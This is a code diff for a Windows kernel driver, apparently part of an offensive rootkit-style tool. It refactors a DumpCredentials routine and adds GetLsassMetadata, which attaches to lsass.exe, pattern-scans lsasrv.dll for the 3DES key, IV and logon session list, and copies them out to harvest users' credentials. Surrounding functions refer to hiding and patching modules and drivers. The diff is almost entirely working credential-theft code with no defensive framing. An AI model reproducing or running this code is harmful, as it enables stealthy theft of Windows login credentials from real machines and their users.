@@ -5,6 +5,11 @@ MemoryHandler::MemoryHandler() {
 	NtCreateThreadEx = NULL;
 	ssdt = NULL;
 
+	lsassMetadata.Collected = false;
+	lsassMetadata.DesKey = NULL;
+	lsassMetadata.IvAddress = NULL;
+	lsassMetadata.LogonSessionList = NULL;
+	lsassMetadata.Lock.Init();
 	cachedLsassInfo.Count = 0;
 	cachedLsassInfo.Creds = NULL;
 	cachedLsassInfo.DesKey.Data = NULL;
@@ -48,6 +53,12 @@ MemoryHandler::~MemoryHandler() {
 			this->cachedLsassInfo.Count = 0;
 		}
 		FreeVirtualMemory(this->cachedLsassInfo.Creds);
+	}
+
+	if (lsassMetadata.Collected) {
+		AutoLock lsassMetaLock(this->lsassMetadata.Lock);
+		FreeVirtualMemory(lsassMetadata.DesKey);
+		this->lsassMetadata.Collected = false;
 	}
 }
 
@@ -382,7 +393,6 @@ _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS MemoryHandler::PatchModule(_In_ PatchedModule* moduleInformation) {
 	PEPROCESS targetProcess = nullptr;
 	PVOID functionAddress = NULL;
-	PVOID moduleImageBase = NULL;
 	WCHAR* moduleName = NULL;
 	CHAR* functionName = NULL;
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
@@ -565,8 +575,6 @@ NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleEntry* moduleEntry) {
 	NTSTATUS status = STATUS_SUCCESS;
 	PEPROCESS targetProcess = NULL;
 	LARGE_INTEGER time = { 0 };
-	PVOID moduleBase = NULL;
-	WCHAR* moduleName = NULL;
 	time.QuadPart = ONE_SECOND;
 
 	if (!moduleEntry)
@@ -721,16 +729,14 @@ NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
 */
 _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
+	NTSTATUS status = STATUS_SUCCESS;
 	KAPC_STATE state;
-	ULONG lsassPid = 0;
-	ULONG foundIndex = 0;
 	SIZE_T bytesWritten = 0;
-	PEPROCESS lsass = NULL;
+	PEPROCESS lsass = nullptr;
 	ULONG credentialsIndex = 0;
 	ULONG validCredentialsCount = 0;
 	ULONG credentialsCount = 0;
-	PVOID lsasrvMain = nullptr;
-	PLSASRV_CREDENTIALS currentCredentials = NULL;
+	PLSASRV_CREDENTIALS currentCredentials = nullptr;
 
 	if (!allocationSize)
 		return STATUS_INVALID_PARAMETER;
@@ -738,124 +744,35 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 	if (this->cachedLsassInfo.Count != 0)
 		return STATUS_ABANDONED;
 
-	__try {
-		lsassPid = FindPidByName(L"lsass.exe");
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		return GetExceptionCode();
-	}
+	if (!lsassMetadata.Collected) {
+		status = GetLsassMetadata(lsass);
+		lsassMetadata.Collected = NT_SUCCESS(status);
 
-	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
-
-	if (!NT_SUCCESS(status))
-		return status;
-
-	__try {
-		lsasrvMain = GetUserModeFuncAddress("LsaIAuditSamEvent", L"\\Windows\\System32\\lsasrv.dll", lsassPid);
+		if (!lsassMetadata.Collected)
+			return status;
 	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		ObDereferenceObject(lsass);
-		return GetExceptionCode();
-	}
+	AutoLock locker(lsassMetadata.Lock);
 
 	KeStackAttachProcess(lsass, &state);
 	do {
-		// Finding LsaEnumerateLogonSession and LsaInitializeProtectedMemory to extract the LogonSessionList and the 3DES key.
-		PVOID lsaEnumerateLogonSessionLocation = FindPattern(const_cast<PUCHAR>(LogonSessionListLocation), 0xCC,
-			sizeof(LogonSessionListLocation), lsasrvMain,
-			LogonSessionListLocationDistance, 0, NULL, UserMode);
-
-		if (!lsaEnumerateLogonSessionLocation) {
-			lsaEnumerateLogonSessionLocation = FindPattern(const_cast<PUCHAR>(LogonSessionListLocation), 0xCC,
-				sizeof(LogonSessionListLocation), lsasrvMain,
-				LogonSessionListLocationDistance, 0, NULL, UserMode, true);
-
-			if (!lsaEnumerateLogonSessionLocation) {
-				status = STATUS_NOT_FOUND;
-				break;
-			}
-		}
-
-		PVOID lsaInitializeProtectedMemory = FindPattern(const_cast<PUCHAR>(IvDesKeyLocation), 0xCC,
-			sizeof(IvDesKeyLocation), lsasrvMain, IvDesKeyLocationDistance, 0, NULL, UserMode);
-
-		if (!lsaInitializeProtectedMemory) {
-			lsaInitializeProtectedMemory = FindPattern(const_cast<PUCHAR>(IvDesKeyLocation), 0xCC,
-				sizeof(IvDesKeyLocation), lsasrvMain, IvDesKeyLocationDistance, 0, NULL, UserMode, true);
-
-			if (!lsaInitializeProtectedMemory) {
-				status = STATUS_NOT_FOUND;
-				break;
-			}
-		}
-
-		PVOID lsaEnumerateLogonSessionStart = FindPattern(const_cast<PUCHAR>(FunctionStartSignature), 0xCC,
-			sizeof(FunctionStartSignature), lsaEnumerateLogonSessionLocation,
-			WLsaEnumerateLogonSessionLen, 0, NULL, UserMode, true);
-
-		if (!lsaEnumerateLogonSessionStart) {
-			status = STATUS_NOT_FOUND;
-			break;
-		}
-
-		// Getting 3DES key
-		PULONG desKeyAddressOffset = static_cast<PULONG>(FindPattern(const_cast<PUCHAR>(DesKeySignature), 0xCC,
-			sizeof(DesKeySignature), lsaInitializeProtectedMemory, LsaInitializeProtectedMemoryLen,
-			DesKeyOffset, &foundIndex, UserMode));
-
-		if (!desKeyAddressOffset) {
-			status = STATUS_NOT_FOUND;
-			break;
-		}
-		PBCRYPT_GEN_KEY desKey = reinterpret_cast<PBCRYPT_GEN_KEY>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) + 
-			(*desKeyAddressOffset) + foundIndex + DesKeyStructOffset);
-		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), sizeof(BCRYPT_GEN_KEY));
-
-		if (!NT_SUCCESS(status))
-			break;
-
-		if (desKey->hKey->tag != DES_KEY_TAG1 || desKey->hKey->key->tag != DES_KEY_TAG2) {
-			status = STATUS_NOT_FOUND;
-			break;
-		}
-
-		this->cachedLsassInfo.DesKey.Size = desKey->hKey->key->hardkey.cbSecret;
+		AutoLock cacheLock(this->cachedLsassInfo.Lock);
+		this->cachedLsassInfo.DesKey.Size = lsassMetadata.DesKey->hKey->key->hardkey.cbSecret;
 		this->cachedLsassInfo.DesKey.Data = AllocateMemory<PVOID>(this->cachedLsassInfo.DesKey.Size);
 
 		if (!cachedLsassInfo.DesKey.Data) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
 			break;
 		}
-		status = MmCopyVirtualMemory(lsass, desKey->hKey->key->hardkey.data, IoGetCurrentProcess(),
+		status = MmCopyVirtualMemory(lsass, lsassMetadata.DesKey->hKey->key->hardkey.data, IoGetCurrentProcess(),
 			this->cachedLsassInfo.DesKey.Data, this->cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
 
 		if (!NT_SUCCESS(status))
 			break;
 
-		// Getting LogonSessionList
-		PULONG logonSessionListAddressOffset = static_cast<PULONG>(FindPattern(const_cast<PUCHAR>(LogonSessionListSignature), 0xCC,
-			sizeof(LogonSessionListSignature), lsaEnumerateLogonSessionStart, WLsaEnumerateLogonSessionLen,
-			LogonSessionListOffset, &foundIndex, UserMode));
-
-		if (!logonSessionListAddressOffset) {
-			status = STATUS_NOT_FOUND;
-			break;
-		}
-
-		PLIST_ENTRY logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(static_cast<PUCHAR>(lsaEnumerateLogonSessionStart) + 
-			(*logonSessionListAddressOffset) + foundIndex);
-
-		logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(AlignAddress(reinterpret_cast<ULONGLONG>(logonSessionListAddress)));
-
-		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), sizeof(PLSASRV_CREDENTIALS));
-
-		if (!NT_SUCCESS(status))
-			break;
-
-		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(logonSessionListAddress->Flink);
+		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList->Flink);
 
 		// Getting the real amount of credentials.
-		while (reinterpret_cast<PLIST_ENTRY>(currentCredentials) != logonSessionListAddress) {			
+		while (currentCredentials != reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList)) {
 			credentialsCount++;
 			currentCredentials = currentCredentials->Flink;
 		}
@@ -870,10 +787,11 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
 			break;
 		}
-		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(logonSessionListAddress->Flink);
+		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList->Flink);
 
 		// Getting the interesting information.
-		for (credentialsIndex = 0; credentialsIndex < credentialsCount && reinterpret_cast<PLIST_ENTRY>(currentCredentials) != logonSessionListAddress;
+		for (credentialsIndex = 0; credentialsIndex < credentialsCount && 
+			currentCredentials != reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList);
 			credentialsIndex++, currentCredentials = currentCredentials->Flink) {
 
 			if (currentCredentials->UserName.Length == 0 || !currentCredentials->Credentials)
@@ -939,6 +857,127 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 	if (lsass)
 		ObDereferenceObject(lsass);
 
+	return status;
+}
+
+/*
+* Description:
+* GetLsassMetadata is responsible for collecting all the required information from lsass in order to decrypt credentials.
+* 
+* Parameters:
+* @lsass  [_Inout_ PEPROCESS&] -- The EPROCESS of lsass.
+* 
+* Returns:
+* @status [NTSTATUS]		   -- Whether successfuly collected or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
+	KAPC_STATE state;
+	ULONG lsassPid = 0;
+	ULONG foundIndex = 0;
+	PVOID lsasrvMain = nullptr;
+	PVOID lsaIGetNbAndDnsDomainNames = nullptr;
+	AutoLock locker(lsassMetadata.Lock);
+
+	if (lsassMetadata.Collected)
+		return STATUS_SUCCESS;
+
+	__try {
+		lsassPid = FindPidByName(L"lsass.exe");
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		return GetExceptionCode();
+	}
+
+	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	__try {
+		lsasrvMain = GetUserModeFuncAddress("LsaIAuditSamEvent", L"\\Windows\\System32\\lsasrv.dll", lsassPid);
+		lsaIGetNbAndDnsDomainNames = GetUserModeFuncAddress("LsaIGetNbAndDnsDomainNames", L"\\Windows\\System32\\lsasrv.dll", lsassPid);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		ObDereferenceObject(lsass);
+		return GetExceptionCode();
+	}
+
+	KeStackAttachProcess(lsass, &state);
+	do {
+		PVOID lsaInitializeProtectedMemory = FindPattern(IvDesKeyLocationPattern, lsasrvMain, IvDesKeyLocationDistance, 0, UserMode);
+
+		if (!lsaInitializeProtectedMemory) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		// Getting the IV
+		PULONG ivAddressOffset = static_cast<PULONG>(FindPattern(IvSignaturePattern, lsaInitializeProtectedMemory, 
+			LsaInitializeProtectedMemoryDistance, &foundIndex, UserMode));
+
+		if (!ivAddressOffset) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		lsassMetadata.IvAddress = static_cast<PVOID>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
+			(*ivAddressOffset) + foundIndex);
+
+		// Getting 3DES key
+		PULONG desKeyAddressOffset = static_cast<PULONG>(FindPattern(DesKeySignaturePattern, lsaInitializeProtectedMemory, 
+			LsaInitializeProtectedMemoryDistance, &foundIndex, UserMode));
+
+		if (!desKeyAddressOffset) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		PBCRYPT_GEN_KEY desKey = reinterpret_cast<PBCRYPT_GEN_KEY>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
+			(*desKeyAddressOffset) + foundIndex + DesKeyStructOffset);
+		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), sizeof(BCRYPT_GEN_KEY));
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		if (desKey->hKey->tag != DES_KEY_TAG1 || desKey->hKey->key->tag != DES_KEY_TAG2) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		lsassMetadata.DesKey = AllocateMemory<PBCRYPT_GEN_KEY>(sizeof(BCRYPT_GEN_KEY));
+
+		if (!lsassMetadata.DesKey) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		lsassMetadata.DesKey->cbKey = desKey->cbKey;
+		lsassMetadata.DesKey->hProvider = desKey->hProvider;
+		lsassMetadata.DesKey->hKey = desKey->hKey;
+		lsassMetadata.DesKey->pKey = desKey->pKey;
+
+		// Getting LogonSessionList
+		PULONG logonSessionListAddressOffset = static_cast<PULONG>(FindPatterns(LogonSessionListPatterns, 
+			LogonSessionListPatternCount, lsaIGetNbAndDnsDomainNames, LogonSessionListDistance,
+			&foundIndex, UserMode));
+
+		if (!logonSessionListAddressOffset) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		PLIST_ENTRY logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(static_cast<PUCHAR>(lsaIGetNbAndDnsDomainNames) +
+			(*logonSessionListAddressOffset) + foundIndex);
+
+		logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(AlignAddress(reinterpret_cast<ULONGLONG>(logonSessionListAddress)));
+
+		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), sizeof(PLSASRV_CREDENTIALS));
+
+		if (!NT_SUCCESS(status))
+			break;
+		lsassMetadata.LogonSessionList = logonSessionListAddress;
+		lsassMetadata.Collected = true;
+	} while (false);
+	KeUnstackDetachProcess(&state);
+
+	if (!NT_SUCCESS(status))
+		FreeVirtualMemory(lsassMetadata.DesKey);
 	return status;
 }
 
